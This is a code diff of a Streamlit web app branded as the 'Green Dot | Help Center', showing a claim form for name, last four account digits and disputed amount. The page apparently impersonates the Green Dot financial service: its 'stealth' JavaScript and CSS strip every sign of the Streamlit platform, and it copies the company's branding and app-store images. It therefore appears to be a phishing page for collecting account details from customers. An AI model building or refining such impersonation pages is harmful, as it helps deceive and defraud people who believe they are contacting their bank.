@@ -23,68 +23,53 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JS NUCLEAR V1.2.6 (CONTROL DE WIDGETS DE CARGA)
+# JS NUCLEAR V1.2.7 (FORZAR CONTRASTE DE WIDGETS)
 st.markdown("""<script>
-    const nuclearClean = () => {
-        const toHide = [
-            'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
-            '[data-testid="stAppToolbar"]', '[data-testid="stHeaderActionElements"]',
-            '.stElementToolbar', '[data-testid="stElementToolbar"]',
-            '.section-anchor', 'a.section-anchor', 'svg.etxdrby1'
-        ];
-        toHide.forEach(s => {
-            document.querySelectorAll(s).forEach(el => { el.style.display = 'none'; el.remove(); });
+    const forceVisibility = () => {
+        // Ocultar elementos basura
+        ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]', '[data-testid="stAppToolbar"]'].forEach(s => {
+            document.querySelectorAll(s).forEach(el => el.remove());
         });
 
-        // Forzar visibilidad de widgets de subida (FileUpload)
-        document.querySelectorAll('[data-testid="stFileUploader"]').forEach(el => {
-            el.style.backgroundColor = '#1a1a1a';
-            el.style.border = '1px solid #333';
-            el.style.borderRadius = '8px';
-            el.style.padding = '10px';
-        });
-
+        // Forzar fondo negro en el contenedor rebelde
         document.querySelectorAll('.st-emotion-cache-h5555q').forEach(el => {
             el.style.backgroundColor = '#000000';
             el.style.color = '#FFFFFF';
-            el.style.border = 'none';
+        });
+
+        // Forzar contraste en zonas de carga de archivos
+        document.querySelectorAll('[data-testid="stFileUploader"] div').forEach(el => {
+            el.style.color = '#FFFFFF';
         });
     };
-    setInterval(nuclearClean, 30);
+    setInterval(forceVisibility, 30);
 </script>""", unsafe_allow_html=True)
 
-# CSS STEALTH TOTAL V1.2.6
+# CSS STEALTH TOTAL V1.2.7
 st.markdown("""<style>
-    /* BLINDAJE NEGRO ABSOLUTO */
+    /* FONDO NEGRO ABSOLUTO */
     html, body, [data-testid="stAppViewContainer"], .stApp {
         background-color: #000000 !important;
-        color: #FFFFFF !important;
     }
 
-    /* FIX ESPECÍFICO PARA UPLOAD (MODO CLARO) */
+    /* VISIBILIDAD DE UPLOADER EN MODO CLARO */
     [data-testid="stFileUploader"] {
         background-color: #1a1a1a !important;
-        padding: 15px !important;
-        border-radius: 10px !important;
-        border: 1px solid #444 !important;
+        border: 1px solid #333 !important;
+        border-radius: 8px !important;
+        padding: 10px !important;
     }
 
-    [data-testid="stFileUploader"] section {
-        background-color: #222 !important;
-        color: white !important;
-    }
-
-    [data-testid="stMarkdownContainer"] p, label, .st-ae {
+    /* Forzar texto blanco en todo el formulario */
+    [data-testid="stMarkdownContainer"] p, label, .st-ae, .st-af, .st-ag, .st-ah {
         color: #FFFFFF !important;
     }
 
-    /* FORZAR ESTADO EN LIGHT MODE */
-    @media (prefers-color-scheme: light) {
-        html, body, [data-testid="stAppViewContainer"], .stApp, .st-emotion-cache-h5555q {
-            background-color: #000000 !important;
-            color: #FFFFFF !important;
-        }
-        [data-testid="stFileUploader"] section { background-color: #222 !important; }
+    /* Eliminar cualquier sombra o borde blanco de Streamlit */
+    .st-emotion-cache-h5555q, .st-emotion-cache-1vo6xi6 {
+        border: none !important;
+        box-shadow: none !important;
+        background-color: #000000 !important;
     }
 
     header, footer, .stDeployButton { display: none !important; }
@@ -95,17 +80,12 @@ st.markdown("""<style>
         color: white !important;
         width: 100%; border: none; height: 50px; border-radius: 8px; font-weight: bold;
     }
-
-    .promo-box {
-        background-color: #111; padding: 20px; border-radius: 12px;
-        text-align: center; margin-top: 20px; border: 1px solid #222;
-    }
 </style>""", unsafe_allow_html=True)
 
 if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
 st.title("Help Center")
 
-with st.form("claim_v1_2_6_final", clear_on_submit=True):
+with st.form("claim_v1_2_7", clear_on_submit=True):
     st.text_input("Full Name")
     st.text_input("Last 4 digits of Account")
     st.number_input("Disputed Amount", format="%.2f")
@@ -114,8 +94,8 @@ with st.form("claim_v1_2_6_final", clear_on_submit=True):
     if st.form_submit_button("SUBMIT NOW"):
         st.success("Claim Received.")
 
-st.markdown("""<div class='promo-box'>
-    <p>Download the Green Dot app</p>
+st.markdown("""<div style='background-color: #111; padding: 20px; border-radius: 12px; text-align: center; margin-top: 20px; border: 1px solid #222;'>
+    <p style='color: white;'>Download the Green Dot app</p>
     <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
     <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
 </div>""", unsafe_allow_html=True)
